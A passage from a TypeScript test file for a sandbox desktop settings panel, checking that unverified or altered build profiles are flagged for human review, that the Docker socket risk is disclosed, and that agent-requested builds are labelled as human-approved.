        expect(screen.getByTestId("sandbox-profile-review-provenance").textContent).toMatch(/unverified store data/);
        fireEvent.click(screen.getByRole("button", { name: "Build profile inkscape from this exact recipe" }));
        await waitFor(() => expect(buildSandboxDesktopImage).toHaveBeenCalledWith("inkscape", "w0123456789ab", digest));
      });
      it("Cancel builds nothing", async () => {
        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [{ ...scoped, reviewRequired: true }] }));
        vi.mocked(getSandboxProfileReview).mockResolvedValue(review);
        render(<SandboxDesktopSettings />);
        fireEvent.click(await screen.findByRole("button", { name: "Rebuild profile inkscape" }));
        await screen.findByTestId("sandbox-profile-review-inkscape");
        fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
        expect(screen.queryByTestId("sandbox-profile-review-inkscape")).toBeNull();
        expect(buildSandboxDesktopImage).not.toHaveBeenCalled();
      });
      it("an unverified global profile is badged with its image state, and says what is known — not that it was planted", async () => {
        const forged = {
          ...promoted,
          name: "office",
          id: "global/office",
          unverified: true as const,
          reviewRequired: true as const,
          image: { name: "x:office", state: "missing" as const },
        };
        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [forged] }));
        vi.mocked(getSandboxProfileReview).mockResolvedValue({
          ...review,
          id: "global/office",
          scope: "global",
          name: "office",
          unverified: true,
          imageState: "missing",
          built: undefined,
        });
        render(<SandboxDesktopSettings />);
        expect((await screen.findByTestId("sandbox-profile-unverified-office")).textContent).toBe("unverified · Not built");
        const text = screen.getByTestId("sandbox-profile-unverified-text-office").textContent!;
        expect(text).toMatch(/No image Callboard built for this global profile exists now \(never built here, image removed, or needs a rebuild: not built\)/);
        expect(text).toMatch(/Its file can.t be trusted on its own: agents don.t see it and it can.t start until you review and build it/);
        expect(text).not.toMatch(/never (built or )?promoted|no promotion/i);
        fireEvent.click(screen.getByRole("button", { name: "Build profile office" }));
        expect((await screen.findByTestId("sandbox-profile-review-unverified")).textContent).toMatch(/No image Callboard built for it exists now.*: missing/);
      });
      it("a promoted profile whose image went insecure says so in its badge", async () => {
        const stale = { ...promoted, unverified: true as const, reviewRequired: true as const, image: { name: "x:gimp", state: "insecure" as const } };
        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [stale] }));
        render(<SandboxDesktopSettings />);
        expect((await screen.findByTestId("sandbox-profile-unverified-gimp")).textContent).toMatch(/^unverified · /);
        expect(screen.getByTestId("sandbox-profile-unverified-gimp").textContent).not.toBe("unverified · Not built");
      });
      it("a built-in file that is not the shipped recipe is flagged, and needs the review", async () => {
        const dropped = {
          ...blender,
          id: "global/zz-review-evil",
          name: "zz-review-evil",
          builtinProblem: "unknown" as const,
          reviewRequired: true as const,
          unverified: true as const,
        };
        const modified = { ...blender, builtinProblem: "modified" as const, reviewRequired: true as const };
        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [dropped, modified] }));
        vi.mocked(getSandboxProfileReview).mockResolvedValue({ ...review, id: "global/blender", scope: "global", name: "blender", builtinProblem: "modified" });
        render(<SandboxDesktopSettings />);
        expect((await screen.findByTestId("sandbox-profile-builtin-problem-zz-review-evil")).textContent).toBe("not shipped with Callboard");
        expect(screen.getByTestId("sandbox-profile-builtin-problem-blender").textContent).toBe("not the shipped recipe");
        fireEvent.click(screen.getByRole("button", { name: /^(Build|Rebuild) profile blender$/ }));
        expect((await screen.findByTestId("sandbox-profile-review-builtin-problem")).textContent).toMatch(
          /differs from the recipe this Callboard version shipped/,
        );
        expect(buildSandboxDesktopImage).not.toHaveBeenCalled();
      });
      it("says plainly that code execution brings the Docker socket", async () => {
        vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [blender] }));
        render(<SandboxDesktopSettings />);
        expect((await screen.findByTestId("sandbox-docker-socket-note")).textContent).toMatch(/Docker access is root access.*code execution.*consent/);
      });
    });

    it("edits the agent caps within their bounds", async () => {
      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status());
      vi.mocked(updateSandboxDesktopSettings).mockResolvedValue(status({ settings: { agentMaxProfilesPerScope: 0 } }));
      render(<SandboxDesktopSettings />);
      const perScope = (await screen.findByLabelText("Agent profiles per workspace/folder (0: agents may not propose)")) as HTMLInputElement;
      expect([perScope.value, perScope.min, perScope.max]).toEqual(["5", "0", "50"]);
      const versions = screen.getByLabelText("Versions kept per agent profile (the oldest not in force are dropped)") as HTMLInputElement;
      expect([versions.value, versions.min, versions.max]).toEqual(["10", "2", "50"]);
      const queued = screen.getByLabelText("Agent builds queued at once, across all chats") as HTMLInputElement;
      expect([queued.value, queued.min, queued.max]).toEqual(["2", "1", "10"]);
      fireEvent.change(perScope, { target: { value: "0" } });
      fireEvent.change(versions, { target: { value: "20" } });
      fireEvent.change(queued, { target: { value: "3" } });
      fireEvent.click(screen.getByRole("button", { name: "Save" }));
      await waitFor(() =>
        expect(updateSandboxDesktopSettings).toHaveBeenCalledWith(
          expect.objectContaining({ agentMaxProfilesPerScope: 0, agentMaxVersions: 20, agentMaxQueuedBuilds: 3 }),
        ),
      );
    });

    it("labels a build an agent requested", async () => {
      const agentBuild = {
        state: "succeeded" as const,
        id: "44444444-4444-4444-4444-444444444444",
        kind: "profile" as const,
        phase: "succeeded" as const,
        profile: "inkscape",
        profileId: scoped.id,
        requestedBy: { kind: "agent" as const, chatId: "chat-1", approvalId: "req-1" },
        version: 3,
        requestedAt: 5,
      };
      const humanBuild = { ...agentBuild, id: "55555555-5555-5555-5555-555555555555", requestedBy: { kind: "human" as const }, version: undefined };
      vi.mocked(getSandboxDesktopStatus).mockResolvedValue(status({ profiles: [scoped], builds: [agentBuild, humanBuild] }));
      render(<SandboxDesktopSettings />);
      expect((await screen.findByTestId(`sandbox-build-${agentBuild.id}`)).textContent).toContain("requested by an agent, approved by a human (v3)");
      expect(screen.getByTestId(`sandbox-build-${humanBuild.id}`).textContent).not.toContain("requested by an agent");
    });
  });
});
